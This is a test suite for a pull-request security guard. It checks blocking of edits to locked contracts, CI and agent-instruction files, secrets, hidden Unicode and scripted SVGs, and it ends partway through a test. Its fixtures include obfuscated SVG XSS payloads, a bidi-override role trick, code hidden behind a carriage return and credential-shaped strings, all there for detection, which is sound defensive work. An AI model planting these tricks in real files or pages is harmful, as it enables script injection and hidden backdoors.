// Tests for pr-guard.mjs. Each case builds a small git repository shaped like this one, makes the change a pull request
// would make, and asks the guard what it sees.  node --test .github/scripts/pr-guard.test.mjs
//
// Invisible characters are built from code points and credentials from pieces, so this file holds neither.

import assert from "node:assert/strict";
import { execFile, execFileSync, spawnSync } from "node:child_process";
import { chmodSync, mkdirSync, mkdtempSync, readFileSync, rmSync, symlinkSync, writeFileSync } from "node:fs";
import { createServer } from "node:http";
import { tmpdir } from "node:os";
import { dirname, join } from "node:path";
import { after, before, describe, test } from "node:test";
import { fileURLToPath } from "node:url";

import {
  OWNERS, RULES, activeSvg, analyze, annotation, hiddenCharacter, hostOf, hostsIn, lintManifest, lintNpmLock, openRepo, ownerApproval, parseHunks,
  parseLock, plain, pusherOf, renderSummary, renderText, scanLines, verdict,
} from "./pr-guard.mjs";

const GUARD = fileURLToPath(new URL("./pr-guard.mjs", import.meta.url));
/** A string from code points, so no invisible character is ever written in this file. */
const cp = (...codes) => String.fromCodePoint(...codes);

// ---------- fixture ----------

const ROUTER = "0x6fF5693b99212Da76ad316178A184AB56D299b43";
const STRANGER = "0x1234567890AbcdEF1234567890aBcdef12345678";
const PIN = "886b4f8b63409ef474542de6394d25a9b5908ed3";
const PNG = Buffer.concat([Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]), Buffer.alloc(40, 1)]);

const LOCK = [
  "# deployed sources",
  `sha256 ${"1b".repeat(32)}  contracts/src/LaunchFactory.sol`,
  `sha256 ${"e3".repeat(32)}  contracts/src/LaunchLocker.sol`,
  `sha256 ${"34".repeat(32)}  contracts/foundry.toml`,
  `sha256 ${"77".repeat(32)}  contracts/deployments/launchpad-base.json`,
  `gitlink ${PIN}  contracts/lib/forge-std`,
  "",
].join("\n");
const LOCKED = parseLock(LOCK);

/** A lockfile entry as the registry writes it; `extra` overrides or adds fields. */
const entry = (name, version, extra = {}) => ({
  version,
  resolved: `https://registry.npmjs.org/${name}/-/${name.split("/").pop()}-${version}.tgz`,
  integrity: `sha512-${"A".repeat(86)}==`,
  ...extra,
});
/** The text of a package-lock.json that holds `packages`: { name: entry }. */
const lockfile = (packages) =>
  `${JSON.stringify({ name: "openlaunch", lockfileVersion: 3, packages: { "": { name: "openlaunch" }, ...Object.fromEntries(Object.entries(packages).map(([name, e]) => [`node_modules/${name}`, e])) } }, null, 2)}\n`;
/** The text of the base package.json with `fields` laid over it. */
const manifest = (fields) => `${JSON.stringify({ name: "openlaunch", private: true, scripts: { test: "tsx --test", build: "next build" }, dependencies: { sharp: "^0.35.4", viem: "^2.47.6" }, ...fields }, null, 2)}\n`;
const BASE_LOCK = { sharp: entry("sharp", "0.35.4"), viem: entry("viem", "2.47.6"), esbuild: entry("esbuild", "0.28.2", { hasInstallScript: true }), "@scope/pkg": entry("@scope/pkg", "1.0.0") };

const ROUTE = [
  'import { verifyMessage } from "viem";',
  "export async function POST(request) {",
  "  if (await rateLimited(request)) return tooMany();",
  "  const ok = await verifyMessage({ address, message, signature });",
  "  if (!ok || !(await consumeNonce(nonce))) return denied();",
  "  return save(await request.json());",
  "}",
  "",
].join("\n");

const BASE = {
  "README.md": "# openlaunch\n\nLaunch should be open and free. Docs: https://openlaunch.lol/agents\n",
  "LICENSE": "MIT\n",
  "SECURITY.md": "Report to security@gitlawb.com\n",
  ".gitignore": "node_modules/\n.env\n",
  ".gitmodules": '[submodule "contracts/lib/forge-std"]\n\tpath = contracts/lib/forge-std\n\turl = https://github.com/foundry-rs/forge-std\n',
  ".github/workflows/ci.yml": "name: ci\n",
  ".github/workflows/pr-guard.yml": "name: pr-guard\n",
  ".github/scripts/pr-guard.mjs": "// guard\n",
  "contracts/deployed.lock": LOCK,
  "contracts/foundry.toml": '[profile.default]\nsolc_version = "0.8.26"\n',
  "contracts/src/LaunchFactory.sol": "// SPDX-License-Identifier: MIT\ncontract LaunchFactory {}\n",
  "contracts/src/LaunchLocker.sol": "// SPDX-License-Identifier: MIT\ncontract LaunchLocker {}\n",
  "contracts/deployments/launchpad-base.json": `{ "LaunchFactory": "0x815542E8b392389A1389E22E588E4B62A67Ade72" }\n`,
  "contracts/script/check-deployed-sources.sh": { content: "#!/usr/bin/env bash\n", mode: 0o755 },
  "contracts/lib/forge-std": { gitlink: PIN },
  "app/package.json": manifest({}),
  "app/package-lock.json": lockfile(BASE_LOCK),
  "app/Dockerfile": "FROM node:22-slim\n",
  "app/db/schema.sql": "create table if not exists launches (id text primary key);\n",
  "app/public/logo.png": PNG,
  "app/public/brand/base.svg": '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1 1"><path d="M0 0h1v1z"/></svg>\n',
  "app/src/lib/security-headers.ts": "export const csp = \"default-src 'self'\";\n",
  "app/src/lib/launchpad/config.ts": `export const NATIVE = "0x0000000000000000000000000000000000000000";\nexport const ROUTER = "${ROUTER}";\nexport const RPC = process.env.BASE_RPC_URL ?? "https://mainnet.base.org";\nexport const OVERLAP = intEnv("SYNC_OVERLAP_BLOCKS", 50);\n`,
  "app/src/app/api/post/route.ts": ROUTE,
  "app/src/components/Hero.tsx": "export function Hero() {\n  return <h1>Launch should be open and free.</h1>;\n}\n",
  "app/src/components/hero.test.ts": 'import test from "node:test";\ntest("hero", () => {});\n',
};

const GIT_ENV = {
  ...process.env, GIT_CONFIG_GLOBAL: "/dev/null", GIT_CONFIG_NOSYSTEM: "1", GIT_TERMINAL_PROMPT: "0",
  GIT_AUTHOR_NAME: "test", GIT_AUTHOR_EMAIL: "test@example.com", GIT_COMMITTER_NAME: "test", GIT_COMMITTER_EMAIL: "test@example.com",
};
let dir, lockFile, baseSha;
/** Run git in the fixture repository and return what it printed. */
const git = (args, input) => execFileSync("git", args, { cwd: dir, input, env: GIT_ENV, stdio: ["pipe", "pipe", "pipe"] }).toString().trim();

/**
 * Write a set of changes and commit them. A value is the file's text or bytes; null deletes; { symlink }, { gitlink },
 * { content, mode } and { index } (a file that exists only in git, for names a Mac cannot hold side by side) do the rest.
 */
function commit(files, message) {
  const late = [];
  for (const [path, value] of Object.entries(files)) {
    const full = join(dir, path);
    if (value === null) { rmSync(full, { recursive: true, force: true }); continue; }
    if (value?.gitlink) { mkdirSync(full, { recursive: true }); late.push(["160000", value.gitlink, path]); continue; }
    if (value?.index !== undefined) { late.push(["100644", git(["hash-object", "-w", "--stdin"], value.index), path]); continue; }
    mkdirSync(dirname(full), { recursive: true });
    rmSync(full, { recursive: true, force: true });
    if (value?.symlink) { symlinkSync(value.symlink, full); continue; }
    writeFileSync(full, value?.content ?? value);
    if (value?.mode) chmodSync(full, value.mode);
  }
  git(["add", "-A", "-f"]); // -f: a pull request can force-add what .gitignore lists
  for (const [mode, sha, path] of late) git(["update-index", "--add", "--cacheinfo", `${mode},${sha},${path}`]);
  git(["commit", "-q", "--allow-empty", "-m", message]);
  return git(["rev-parse", "HEAD"]);
}

/** The head commit of a pull request that makes `changes` on top of the base. */
function pullRequest(changes) {
  git(["checkout", "-q", "-f", "--detach", baseSha]);
  git(["reset", "-q", "--hard", baseSha]);
  git(["clean", "-fdxq"]);
  return commit(changes, "pull request");
}
/** The guard's findings for a pull request that makes `changes`. */
const check = (changes) => analyze(openRepo(dir, baseSha, pullRequest(changes)), { lockedPaths: LOCKED });
/** The distinct rules among some findings, sorted. */
const rules = (findings) => [...new Set(findings.map((f) => f.rule))].sort();
/** The findings of one rule. */
const of = (findings, rule) => findings.filter((f) => f.rule === rule);
/** The details of one rule's findings, joined into one string to match against. */
const details = (findings, rule) => of(findings, rule).map((f) => f.detail).join(" | ");

before(() => {
  dir = mkdtempSync(join(tmpdir(), "pr-guard-"));
  lockFile = join(mkdtempSync(join(tmpdir(), "pr-guard-lock-")), "deployed.lock");
  writeFileSync(lockFile, LOCK);
  git(["init", "-q", "-b", "main"]);
  git(["config", "core.ignorecase", "false"]);
  baseSha = commit(BASE, "base");
});
after(() => {
  rmSync(dir, { recursive: true, force: true });
  rmSync(dirname(lockFile), { recursive: true, force: true });
});

// ---------- the contract freeze ----------

describe("deployed contracts", () => {
  test("editing a locked source is blocked", () => {
    const found = check({ "contracts/src/LaunchFactory.sol": "// SPDX-License-Identifier: MIT\ncontract LaunchFactory { }\n" });
    assert.deepEqual(rules(found), ["contract-locked"]);
    assert.equal(found[0].tier, "block");
    assert.equal(found[0].detail, "edited");
  });

  test("a one-byte change is enough", () => {
    assert.deepEqual(rules(check({ "contracts/src/LaunchLocker.sol": "// SPDX-License-Identifier: MIT\ncontract LaunchLocker {}\n\n" })), ["contract-locked"]);
  });

  test("deleting a locked source is blocked", () => {
    const found = check({ "contracts/src/LaunchLocker.sol": null });
    assert.deepEqual(rules(found), ["contract-locked"]);
    assert.equal(found[0].detail, "deleted");
  });

  test("renaming a locked source is a deletion plus a new file", () => {
    const found = check({ "contracts/src/LaunchFactory.sol": null, "contracts/src/Factory.sol": "// SPDX-License-Identifier: MIT\ncontract LaunchFactory {}\n" });
    assert.deepEqual(rules(found), ["contract-locked", "contracts"]);
  });

  test("the lock, its check script, the build settings and the deployment records are locked too", () => {
    for (const path of ["contracts/deployed.lock", "contracts/script/check-deployed-sources.sh", "contracts/foundry.toml", "contracts/deployments/launchpad-base.json"]) {
      assert.deepEqual(rules(check({ [path]: "changed\n" })), ["contract-locked"], path);
    }
  });

  test("a locked file cannot be swapped for a symlink", () => {
    assert.deepEqual(rules(check({ "contracts/foundry.toml": { symlink: "../app/package.json" } })), ["contract-locked", "symlink"]);
  });

  test("a new contract file is allowed, for an owner to read", () => {
    const found = check({ "contracts/src/LaunchFactoryBnb.sol": "// SPDX-License-Identifier: MIT\ncontract LaunchFactoryBnb {}\n" });
    assert.deepEqual(rules(found), ["contracts"]);
    assert.equal(found[0].tier, "review");
  });

  test("a new contract that adds an owner or a pause names the ground rule it breaks", () => {
    const found = check({ "contracts/src/Vault.sol": "contract Vault is Ownable {\n  /// no admin here\n  function stop() external onlyOwner { _pause(); }\n}\n" });
    assert.deepEqual(rules(found), ["contract-rules", "contracts"]);
    assert.match(details(found, "contract-rules"), /Ownable/);
    assert.match(details(found, "contract-rules"), /onlyOwner/);
    assert.doesNotMatch(details(found, "contract-rules"), /admin/, "comment lines are not code");
  });

  test("an owner, a pause or a fee that is written without a library is named too", () => {
    const found = check({ "contracts/src/Vault.sol": "contract Vault {\n  address public owner;\n  bool public paused;\n  uint16 public feeBps;\n  function setProtocolFee(uint16 fee) external { require(msg.sender == owner); feeBps = fee; }\n}\n" });
    for (const word of ["owner", "paused", "feeBps", "setProtocolFee"]) assert.ok(of(found, "contract-rules").some((f) => f.detail === word), word);
  });

  test("a history with two common ancestors is blocked: its diff does not show what merging it would undo", () => {
    // main: one commit, then a fix that came in from a side branch by a merge
    git(["checkout", "-q", "-f", "--detach", baseSha]);
    git(["reset", "-q", "--hard", baseSha]);
    git(["clean", "-fdxq"]);
    const before = commit({ "docs/notes.md": "notes\n" }, "main moves on");
    git(["checkout", "-q", "-f", "--detach", baseSha]);
    const fix = commit({ "app/src/app/api/post/route.ts": ROUTE.replace("  return save(", "  if (!isOrigin(request)) return denied();\n  return save(") }, "a fix on a side branch");
    git(["checkout", "-q", "-f", "--detach", before]);
    git(["merge", "-q", "--no-ff", "-m", "merge the fix", fix]);
    const main = git(["rev-parse", "HEAD"]);
    // the pull request: main as it was before the fix, with the fix named as a parent ("already merged, and dropped")
    const head = git(["commit-tree", `${before}^{tree}`, "-p", before, "-p", fix, "-m", "ours"]);
    const repo = openRepo(dir, main, head);
    assert.equal(repo.mergeBases.length, 2);
    const found = analyze(repo, { lockedPaths: LOCKED });
    assert.ok(found.some((f) => f.rule === "criss-cross" && f.tier === "block" && f.detail === "2 common ancestors with the base branch"));
    assert.equal(verdict(found, { author: OWNERS[0], pusher: OWNERS[0], approvedBy: OWNERS[0] }).outcome, "block");
    // and git, asked to merge it, takes the fix back out of main without a conflict
    const merged = git(["merge-tree", "--write-tree", main, head]);
    assert.ok(!git(["show", `${merged}:app/src/app/api/post/route.ts`]).includes("isOrigin"), "the merge undoes the fix");
    // merging main into the branch leaves one common ancestor, and then the diff shows everything
    const updated = git(["commit-tree", `${main}^{tree}`, "-p", head, "-p", main, "-m", "merge main"]);
    assert.deepEqual(analyze(openRepo(dir, main, updated), { lockedPaths: LOCKED }), []);
  });

  test("tests, scripts and docs under contracts/ need an owner as well", () => {
    assert.deepEqual(rules(check({ "contracts/test/New.t.sol": "contract NewTest {}\n" })), ["contracts"]);
    assert.deepEqual(rules(check({ "contracts/docs/NOTES.md": "notes\n" })), ["contracts"]);
  });

  test("re-pinning a library is blocked", () => {
    const found = check({ "contracts/lib/forge-std": { gitlink: "1".repeat(40) } });
    assert.deepEqual(rules(found), ["contract-locked", "submodule"]);
    assert.match(details(found, "submodule"), /different commit/);
  });

  test("a new submodule anywhere is blocked, and so is the submodule table", () => {
    const found = check({ "vendor/kit": { gitlink: "2".repeat(40) }, ".gitmodules": '[submodule "vendor/kit"]\n\tpath = vendor/kit\n\turl = https://github.com/someone/kit\n' });
    assert.deepEqual(rules(found), ["contract-locked", "submodule"]);
    assert.deepEqual(of(found, "submodule").map((f) => f.path), ["vendor/kit"]);
  });

  test("nothing is added beside the pinned libraries", () => {
    const found = check({ "contracts/lib/v4-core/src/Hooks.sol": "library Hooks {}\n" });
    assert.deepEqual(rules(found), ["contract-locked"]);
    assert.equal(found[0].detail, "added");
  });

  test("a name that differs from a contract only by letter case is blocked", () => {
    const found = check({ "contracts/src/launchfactory.sol": { index: "contract LaunchFactory { address owner; }\n" } });
    assert.ok(rules(found).includes("case-collision"));
    assert.match(details(found, "case-collision"), /contracts\/src\/LaunchFactory\.sol/);
  });

  test("a folder that differs only by letter case is caught as well", () => {
    assert.ok(rules(check({ "Contracts/src/Extra.sol": { index: "contract Extra {}\n" } })).includes("case-collision"));
  });

  test("parseLock reads both kinds of line and always includes the lock's own guards", () => {
    assert.ok(LOCKED.has("contracts/src/LaunchFactory.sol") && LOCKED.has("contracts/lib/forge-std"));
    assert.ok(LOCKED.has("contracts/deployed.lock") && LOCKED.has(".gitmodules") && LOCKED.has("contracts/script/check-arc-factory.sh"));
    assert.ok(!parseLock("sha256 nothex  contracts/src/X.sol\n").has("contracts/src/X.sol"));
  });
});

// ---------- CI and developer machines ----------

describe("CI and machine configuration", () => {
  test("editing, adding or deleting anything under .github is blocked", () => {
    assert.deepEqual(rules(check({ ".github/workflows/ci.yml": "name: ci\non: push\n" })), ["ci-config"]);
    assert.deepEqual(rules(check({ ".github/workflows/extra.yml": "name: extra\n" })), ["ci-config"]);
    assert.deepEqual(rules(check({ ".github/workflows/pr-guard.yml": null })), ["ci-config"]);
    assert.deepEqual(rules(check({ ".github/scripts/pr-guard.mjs": "// no guard\n" })), ["ci-config"]);
    assert.deepEqual(rules(check({ "CODEOWNERS": "* @someone\n" })), ["ci-config"]);
  });

  test("agent instructions, editor tasks and git hooks are blocked", () => {
    for (const path of ["CLAUDE.md", "AGENTS.md", "app/AGENTS.md", ".claude/settings.json", ".cursor/rules/a.mdc", ".cursorrules", ".mcp.json", ".vscode/tasks.json", ".devcontainer/devcontainer.json", ".husky/pre-commit", ".envrc", "app/.envrc", "CLAUDE.local.md", "AGENTS.override.md", ".devcontainer.json", ".clinerules/rules.md", "app.code-workspace", ".zed/tasks.json", ".roo/rules.md", ".kiro/steering.md"]) {
      const found = check({ [path]: "x\n" });
      assert.ok(rules(found).includes("dev-machine"), path);
      assert.ok(found.every((f) => f.rule !== "dev-machine" || f.tier === "block"), path);
    }
  });

  test("tool managers that run hooks are covered", () => {
    assert.ok(rules(check({ "mise.toml": "[hooks]\nenter = 'echo hi'\n" })).includes("dev-machine"));
    assert.ok(rules(check({ ".lefthook.yml": "pre-commit:\n" })).includes("dev-machine"));
  });

  test("the match ignores letter case, because a Mac does", () => {
    assert.ok(rules(check({ "claude.md": "x\n" })).includes("dev-machine"));
  });

  test("package manager configuration is blocked", () => {
    assert.deepEqual(rules(check({ "app/.npmrc": "loglevel=error\n" })), ["registry-config"]);
    assert.ok(rules(check({ ".yarnrc.yml": "npmRegistryServer: x\n" })).includes("registry-config"));
  });

  test("any other new file or folder whose name begins with a dot needs an owner", () => {
    assert.deepEqual(check({ ".coderabbit.yaml": "reviews:\n  auto_review:\n    enabled: false\n" }).map((f) => [f.rule, f.tier, f.detail]), [["dot-file", "review", ".coderabbit.yaml is new"]]);
    assert.deepEqual(rules(check({ "tools/.cache/list.json": "[]\n" })), ["dot-file"]);
    assert.deepEqual(rules(check({ ".gitlab-ci.yml": "stages: []\n" })), ["dot-file"], "only .gitignore and .gitkeep are git's housekeeping");
    // one the repository already has, git's own housekeeping, and ones another rule already refuses or sends to an owner
    assert.deepEqual(rules(check({ ".gitignore": "node_modules/\n.env\n.next/\n" })), []);
    assert.deepEqual(rules(check({ "tools/.gitignore": "out/\n", "tools/fixtures/.gitkeep": "", "tools/tmp/.keep": "" })), []);
    assert.deepEqual(rules(check({ "app/.env.local": "x\n" })), ["secret-file"]);
    assert.deepEqual(rules(check({ ".gitattributes": "*.sol linguist-vendored\n" })), ["git-config"]);
    assert.deepEqual(rules(check({ ".vscode/tasks.json": "{}\n" })), ["dev-machine"]);
  });

  test("a file name with a character outside ASCII is blocked: a Mac folds some of them onto plain letters", () => {
    // the long s: on a Mac this path is contracts/src/LaunchFactory.sol, and the next one is .vscode/tasks.json
    const names = [`contract${cp(0x17f)}/src/LaunchFactory.sol`, `.v${cp(0x17f)}code/tasks.json`, `AGENT${cp(0x17f)}.md`, `app/package.j${cp(0x17f)}on`, `docs/caf${cp(0xe9)}.md`];
    for (const name of names) {
      const found = check({ [name]: { index: "x\n" } });
      assert.ok(found.some((f) => f.rule === "odd-path" && f.tier === "block" && /outside plain ASCII/.test(f.detail)), name);
    }
  });

  test("two new names that differ only by letter case collide; one file renamed only in its case does not", () => {
    const pair = check({ "app/src/lib/Helper.ts": { index: "export {};\n" }, "app/src/lib/helper.ts": { index: "export const x = 1;\n" } });
    assert.deepEqual(pair.map((f) => [f.rule, f.path, f.detail]), [["case-collision", "app/src/lib/helper.ts", "collides with app/src/lib/Helper.ts"]]);
    assert.ok(rules(check({ "docs/New/a.md": { index: "a\n" }, "docs/new/b.md": { index: "b\n" } })).includes("case-collision"));
    assert.deepEqual(rules(check({ "README.md": null, "readme.md": { index: BASE["README.md"] } })), []);
  });

  test("a symlink is blocked", () => {
    assert.deepEqual(rules(check({ "docs/readme": { symlink: "../README.md" } })), ["symlink"]);
  });

  test("a file name with a line break or an invisible character is blocked", () => {
    assert.ok(rules(check({ "app/src/a\nb.ts": "export {};\n" })).includes("odd-path"));
    assert.ok(rules(check({ [`app/src/safe${cp(0x202e)}st.ts`]: "export {};\n" })).includes("odd-path"));
  });
});

// ---------- credentials ----------

describe("credentials", () => {
  const key = "c0ffee".repeat(10) + "abcd";
  test("environment, key and wallet files are blocked by name", () => {
    for (const path of [".env", "app/.env.local", "app/.env.production", "contracts/.rh-lp-wallet.address", "deploy.pem", "contracts/keystore/deployer", "wallet-backup.json", ".aws/credentials"]) {
      assert.ok(rules(check({ [path]: "x\n" })).includes("secret-file"), path);
    }
  });

  test(".env.example is not a secret file", () => {
    assert.deepEqual(rules(check({ "app/.env.example": "DATABASE_URL=postgres://localhost/openlaunch_dev\n" })), ["build-deploy"]);
  });

  test("a private key in code is blocked, and its value is never repeated", () => {
    const found = check({ "app/scripts/deploy.mjs": `const PRIVATE_KEY = "0x${key}";\n` });
    assert.ok(rules(found).includes("secret"));
    const report = renderSummary(found, verdict(found, { author: "someone", pusher: "someone" }), { headSha: "a".repeat(40) }) + renderText(found, verdict(found, {})) + JSON.stringify(found);
    assert.ok(!report.includes(key), "the key must not be echoed into the public job log");
  });

  test("a transaction hash is not a key", () => {
    assert.deepEqual(rules(check({ "app/src/lib/tx.ts": `export const DEPLOY_TX = "0x${key}";\n` })), []);
  });

  test("tokens and keyed URLs are recognised by their shape", () => {
    const samples = {
      "a private key block": "-----BEGIN " + "EC PRIVATE KEY-----",
      "an AWS access key": "AKIA" + "ABCDEFGHIJKLMNOP",
      "a GitHub token": "ghp_" + "a1B2".repeat(9),
      "an npm token": "npm_" + "a1B2".repeat(9),
      "an RPC URL with its key": "https://base-mainnet.g.alchemy.com/v2/" + "abcDEF123456".repeat(2),
      "a database URL with its password": "postgres://app:" + "s3cr3tPass99" + "@db.internal:5432/openlaunch",
      "a recovery phrase": "mnemonic: " + Array.from({ length: 12 }, (_, i) => ["apple", "river", "stone"][i % 3]).join(" "),
    };
    for (const [what, value] of Object.entries(samples)) {
      const found = scanLines("docs/notes.md", [{ n: 1, text: `value = ${value}` }], [], { addresses: new Set(), hosts: new Set(["base-mainnet.g.alchemy.com"]), env: new Set() });
      assert.ok(of(found, "secret").some((f) => f.detail === what), what);
    }
  });

  test("placeholders in documentation are not credentials", () => {
    for (const text of ["postgres://postgres:postgres@127.0.0.1:5432/quote_indexer", "postgres://dev:devpass@localhost/app", "postgres://user:password@host:5432/db", "postgres://app:<password>@db.flycast:5432/app", "postgres://localhost/openlaunch_dev", "DATABASE_URL=postgres://app:${DB_PASSWORD}@db/app", "mnemonic: test test test test test test test test test test test junk"]) {
      assert.deepEqual(of(scanLines("app/LAUNCH.md", [{ n: 1, text }], [], { addresses: new Set(), hosts: new Set(["host", "db.flycast", "db"]), env: new Set() }), "secret"), [], text);
    }
  });
});

// ---------- hidden characters ----------

describe("hidden characters", () => {
  const family = cp(0x1f468, 0x200d, 0x1f469, 0x200d, 0x1f467);
  test("a text direction override is blocked", () => {
    const found = check({ "app/src/lib/access.ts": `const role = "user${cp(0x202e)} // admin";\n` });
    assert.deepEqual(rules(found), ["hidden-unicode"]);
    assert.equal(found[0].line, 1);
  });

  test("zero-width and tag characters are blocked", () => {
    assert.equal(hiddenCharacter(`is${cp(0x200b)}Admin`), "an invisible character");
    assert.equal(hiddenCharacter(`note${cp(0xe0049, 0xe0067)}`), "an invisible character");
    assert.equal(hiddenCharacter(`a${cp(0x1b)}[2K`), "a control character");
    assert.equal(hiddenCharacter(`line${cp(0x2028)}break`), "an invisible character");
  });

  test("a joiner inside an emoji is fine, between letters it is not", () => {
    assert.equal(hiddenCharacter(`family ${family} ok`), null);
    assert.equal(hiddenCharacter(`ad${cp(0x200d)}min`), "a zero-width joiner outside an emoji");
  });

  test("a byte order mark is fine only at the very start of a file", () => {
    assert.equal(hiddenCharacter(`${cp(0xfeff)}export {};`, true), null);
    assert.equal(hiddenCharacter(`${cp(0xfeff)}export {};`, false), "a byte order mark inside the file");
    assert.equal(hiddenCharacter(`export${cp(0xfeff)} {};`, true), "a byte order mark inside the file");
  });

  test("a variation selector is fine after an emoji and on a keycap, and blocked anywhere else", () => {
    assert.equal(hiddenCharacter(`liked ${cp(0x2764, 0xfe0f)}, step ${cp(0x31, 0xfe0f, 0x20e3)}, flag ${cp(0x1f3f3, 0xfe0f, 0x200d, 0x1f308)}`), null);
    assert.equal(hiddenCharacter(`a${cp(0xfe0f)}b`), "a variation selector outside an emoji");
    assert.equal(hiddenCharacter(`${cp(0x2764, 0xfe0f, 0xfe0f)}`), "a variation selector outside an emoji", "never twice");
    // a run of them after a letter is how bytes are hidden in a source file
    assert.deepEqual(rules(check({ "app/src/lib/x.ts": `const v = "a${cp(0xfe00, 0xfe01, 0xfe02, 0xfe03)}";\n` })), ["hidden-unicode"]);
  });

  test("a carriage return inside a line is blocked; a Windows line ending is not one", () => {
    // to the compiler the comment ends at the return, and what follows is code
    const found = check({ "contracts/src/Vault.sol": "contract Vault {\n  // nothing to see\raddress attacker;\n}\n" });
    assert.deepEqual(rules(found), ["contracts", "hidden-unicode"]);
    assert.equal(details(found, "hidden-unicode"), "a carriage return inside a line");
    assert.deepEqual(rules(check({ "docs/guide.md": "## Guide\r\n\r\nRun `npm test`.\r\n" })), []);
  });

  test("the same character written as an escape is visible, so it passes", () => {
    assert.deepEqual(rules(check({ "app/src/lib/strip.ts": `export const RLO = "\\${"u202E"}";\nexport const tabs = "a\\tb";\n` })), []);
  });

  test("plain text in other scripts and ordinary emoji pass", () => {
    assert.equal(hiddenCharacter("Größe, 日本語, العربية, emoji 🚀 and " + family), null);
  });
});

// ---------- binaries ----------

describe("binary files", () => {
  test("a real image passes without a finding", () => {
    assert.deepEqual(rules(check({ "app/public/new.png": PNG })), []);
  });

  test("a file that is not what its name says is blocked", () => {
    assert.deepEqual(rules(check({ "app/public/photo.png": "#!/bin/sh\necho hi\n" })), ["binary"]);
    assert.deepEqual(rules(check({ "app/public/photo.jpg": PNG })), ["binary"]);
  });

  test("executables and archives are blocked", () => {
    assert.deepEqual(rules(check({ "tools/helper": Buffer.from([0x7f, 0x45, 0x4c, 0x46, 0, 0, 0, 0, 1, 2, 3]) })), ["binary"]);
    assert.deepEqual(rules(check({ "app/public/pack.wasm": Buffer.from([0, 0x61, 0x73, 0x6d, 1, 0, 0, 0]) })), ["binary", "security-config"]);
  });

  test("source saved as UTF-16 counts as binary, because the scanner cannot read it", () => {
    assert.deepEqual(rules(check({ "app/src/lib/x.ts": Buffer.from("export const x = eval('1');\n", "utf16le") })), ["binary"]);
  });

  test("video needs an owner", () => {
    assert.deepEqual(rules(check({ "brand/clip.mp4": Buffer.concat([Buffer.from([0, 0, 0, 0x18]), Buffer.from("ftypmp42"), Buffer.alloc(16)]) })), ["media"]);
  });

  const svg = (body, attributes = "") => `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1 1"${attributes}>${body}</svg>\n`;

  test("an SVG with script or an event handler is blocked; a plain one the site serves needs an owner", () => {
    const scripted = check({ "app/public/a.svg": svg("<script>alert(1)</script>") });
    assert.deepEqual(scripted.map((f) => [f.rule, f.tier, f.detail]), [["security-config", "review", "added"], ["svg-active", "block", "a script or an embedded document"]]);
    assert.ok(rules(check({ "app/public/b.svg": svg('<path d="M0 0h1"/>', ' onload="go()"') })).includes("svg-active"));
    assert.deepEqual(rules(check({ "app/public/c.svg": svg('<path d="M0 0h1v1z"/>') })), ["security-config"]);
    // an SVG the site does not serve is still not allowed to carry script
    assert.deepEqual(rules(check({ "brand/mark.svg": svg('<path d="M0 0h1v1z"/>') })), []);
    assert.deepEqual(rules(check({ "brand/mark.svg": svg("<script>alert(1)</script>") })), ["svg-active"]);
  });

  test("script is found in an SVG however the file is laid out or spelled", () => {
    const prefix = cp(0xe9);
    const active = {
      "a script element under a namespace prefix": '<svg xmlns="http://www.w3.org/2000/svg"><x:script xmlns:x="http://www.w3.org/2000/svg">alert(1)</x:script></svg>',
      "a prefix that is not plain letters": `<svg xmlns="http://www.w3.org/2000/svg"><${prefix}:script xmlns:${prefix}="http://www.w3.org/2000/svg">alert(1)</${prefix}:script></svg>`,
      "a handler on a line of its own, away from its =": '<svg xmlns="http://www.w3.org/2000/svg"\n  onload\n  ="go()"><path d="M0 0h1"/></svg>',
      "a handler at the very start of a line": '<svg xmlns="http://www.w3.org/2000/svg"\nonload="go()"><path d="M0 0h1"/></svg>',
      "the colon of javascript: as a character reference": svg('<a href="javascript&#58;alert(1)"><path d="M0 0h1"/></a>'),
      "a letter of javascript: as a character reference": svg('<a href="&#x6A;avascript:alert(1)"><path d="M0 0h1"/></a>'),
      "a tab inside javascript:, which a browser drops": svg('<a href="java&#9;script:alert(1)"><path d="M0 0h1"/></a>'),
      "a line break inside javascript:": svg('<a xlink:href="jav&#x0A;ascript:alert(1)"><path d="M0 0h1"/></a>'),
      "a handler given as a default attribute by the document type": '<!DOCTYPE svg [ <!ATTLIST svg onload CDATA "alert(1)"> ]>\n<svg xmlns="http://www.w3.org/2000/svg"/>',
      "an animation that sets a handler": svg('<set attributeName="onmouseover" to="alert(1)"/>'),
      "an HTML form inside the image": svg('<h:form xmlns:h="http://www.w3.org/1999/xhtml" action="/collect"><h:input name="seed"/></h:form>'),
      "the HTML namespace spelled with a character reference": svg('<h:meta xmlns:h="http://www.w3.org/1999/xhtm&#108;" http-equiv="refresh" content="0;url=/x"/>'),
      "an embedded document": svg('<foreignObject width="1" height="1"><p>hi</p></foreignObject>'),
      "a stylesheet instruction over two lines": '<?xml-stylesheet\n href="x.xsl" type="text/xsl"?>\n<svg xmlns="http://www.w3.org/2000/svg"/>',
    };
    for (const [what, text] of Object.entries(active)) assert.ok(activeSvg(text), what);
    // through the whole guard, in a file that is new to the pull request
    for (const what of ["a handler on a line of its own, away from its =", "a script element under a namespace prefix", "the colon of javascript: as a character reference"]) {
      assert.ok(rules(check({ "app/public/x.svg": `${active[what]}\n` })).includes("svg-active"), what);
    }
  });

  test("ordinary SVGs are not mistaken for scripted ones", () => {
    const inert = {
      "a path": svg('<path d="M0 0h1v1z"/>'),
      "a gradient, a clip path and a use": svg('<defs><linearGradient id="g"><stop offset="0" stop-color="#fff"/></linearGradient><clipPath id="c"><rect width="1" height="1"/></clipPath></defs><use href="#c" fill="url(#g)"/>'),
      "a style block and a link to a site": svg('<style>.a{fill:#000}</style><a href="https://openlaunch.lol"><text class="a">launch, online</text></a>'),
      "an XML declaration and a character reference in a title": `<?xml version="1.0" encoding="UTF-8"?>\n${svg('<title>Base &#8212; logo &amp; mark</title><path d="M0 0h1"/>')}`,
      "an editor's own metadata": '<svg xmlns="http://www.w3.org/2000/svg" xmlns:inkscape="http://www.inkscape.org/namespaces/inkscape"><inkscape:grid type="xygrid"/><path d="M0 0h1"/></svg>',
    };
    for (const [what, text] of Object.entries(inert)) assert.equal(activeSvg(text), null, what);
  });

  test("an SVG is read whole whatever its size, and one that cannot be read is blocked", () => {
    const large = check({ "app/public/big.svg": svg(`<path d="${"M0 0h1v1z".repeat(240_000)}"/><script>alert(1)</script>`) });
